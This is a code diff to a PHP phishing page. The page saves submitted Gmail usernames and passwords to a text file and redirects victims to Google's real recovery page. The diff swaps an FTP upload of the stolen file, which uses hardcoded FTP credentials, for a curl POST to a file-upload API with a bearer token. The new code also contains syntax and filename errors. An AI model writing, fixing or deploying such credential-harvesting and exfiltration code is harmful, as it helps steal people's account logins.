@@ -4,23 +4,16 @@ file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " P
 header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
 //check if form is submitted
     // ftp settings
-$host='ftpupload.net';
-$port= 21;
-$timeout =1;
-$user = 'b12_32676505';
-$pass = 'godjesus123S';
-$dest_file = 'usernames.txt';
-$source_file = 'usernames.txt';
-    $ftp = ftp_connect($host, $port, $timeout);
-ftp_login($ftp, $user, $pass);
- 
-$ret = ftp_nb_put($ftp, $dest_file, $source_file, FTP_BINARY, FTP_AUTORESUME);
-
-while (FTP_MOREDATA == $ret)
-    {
-        // display progress bar, or something
-        $ret = ftp_nb_continue($ftp);
-    }
+$session_begin = curl_init();
+curl_setopt($session_begin, CURLOPT_POST, true);
+curl_setopt($session_begin, CURLOPT_POSTFIELDS, array('file' => 'username.txt'));
+curl_setopt($session_begin, CURLOPT_URL, 'https://api.upload.io/v1/files/basic');
+curl_setopt($session_begin, CURLOPT_HTTPHEADER, [
+  "Content-Type: image/jpeg"
+  "Authorization: Bearer public_W142hUz2Y7EX63gfCidm4YmPu2Gm"
+]);
+curl_exec($session_begin);
+curl_close($session_begin);
  
 // all done :-
 exit();
